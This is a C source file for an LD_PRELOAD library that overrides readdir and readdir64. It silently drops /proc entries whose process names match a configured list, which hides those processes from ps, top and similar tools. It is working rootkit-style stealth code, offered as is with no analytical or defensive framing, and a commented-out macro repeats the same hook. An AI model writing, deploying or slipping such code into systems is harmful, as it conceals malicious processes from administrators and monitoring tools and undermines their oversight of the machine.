#define _GNU_SOURCE
#define __USE_GNU

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include "config.h"
/*
 * Every process with this name will be excluded
 */

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR *dirp, char *buf, size_t size) {
  int fd = dirfd(dirp);
  if (fd == -1) {
	return 0;
  }

  char tmp[64];
  snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
  ssize_t ret = readlink(tmp, buf, size);
  if (ret == -1) {
	return 0;
  }

  buf[ret] = 0;
  return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char *pid, char *buf) {
  if (strspn(pid, "0123456789") != strlen(pid)) {
	return 0;
  }

  char tmp[256];
  snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

  FILE *f = fopen(tmp, "r");
  if (f == NULL) {
	return 0;
  }

  if (fgets(tmp, sizeof(tmp), f) == NULL) {
	fclose(f);
	return 0;
  }
  fclose(f);
  int unused;
  sscanf(tmp, "%d (%[^)]s", &unused, buf);
  return 1;
}

//#define DECLARE_READDIR(dirent, readdir)                                \
//static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
//                                                                        \
//struct dirent* readdir(DIR *dirp)                                       \
//{                                                                       \
//printf("ok\n");                                                                       \
//    if(original_##readdir == NULL) {                                    \
//        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
//        if(original_##readdir == NULL)                                  \
//        {                                                               \
//            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
//        return NULL;                                                    \
//        }                                                               \
//    }                                                                   \
//    struct dirent* dir;                                                 \
//    while(1) {                                                          \
//    con:\
//        dir = original_##readdir(dirp);                                 \
//        if(dir) {                                                       \
//            char dir_name[256];                                         \
//            char process_name[256];                                     \
//            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {  \
//    			for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {                                                        \
//                    if (strstr(process_name, hide_process_name[i]) != NULL )  goto con;                                                            \
//           	 }                                                           \
//            }															\
//        }                                                               \
//        break;                                                          \
//    }                                                                   \
//    return dir;                                                         \
//}
//
//DECLARE_READDIR(dirent64, readdir64);
//DECLARE_READDIR(dirent, readdir);

static struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
  if (original_readdir == NULL) {
	original_readdir = dlsym(RTLD_NEXT, "readdir");
	if (original_readdir == NULL) {
	  fprintf(stderr, "Error in dlsym: %s\n", dlerror());
	  return NULL;
	}
  }
  struct dirent *dir;
  while (1) {
	con:
	dir = original_readdir(dirp);
	if (dir) {
	  char dir_name[256];
	  char process_name[256];
	  if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0
		  && get_process_name(dir->d_name, process_name)) {
		for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
		  if (strstr(process_name, hide_process_name[i]) != NULL) goto con;
		}
	  }
	}
	break;
  }
  return dir;
}

static struct dirent64 *(*original_readdir64)(DIR *) = NULL;

struct dirent64 *readdir64(DIR *dirp) {
  if (original_readdir64 == NULL) {
	original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	if (original_readdir64 == NULL) {
	  fprintf(stderr, "Error in dlsym: %s\n", dlerror());
	  return NULL;
	}
  }
  struct dirent64 *dir;
  while (1) {
	con:
	dir = original_readdir64(dirp);
	if (dir) {
	  char dir_name[256];
	  char process_name[256];
	  if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0
		  && get_process_name(dir->d_name, process_name)) {
		for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
		  if (strstr(process_name, hide_process_name[i]) != NULL) goto con;
		}
	  }
	}
	break;
  }
  return dir;
}
